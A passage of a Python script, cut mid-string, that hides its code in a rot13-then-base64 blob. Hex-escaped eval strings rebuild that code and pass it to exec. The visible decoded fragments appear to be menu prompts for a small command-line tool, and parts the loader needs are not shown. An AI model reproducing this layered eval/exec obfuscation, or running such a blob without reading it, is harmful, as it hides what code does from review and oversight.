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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
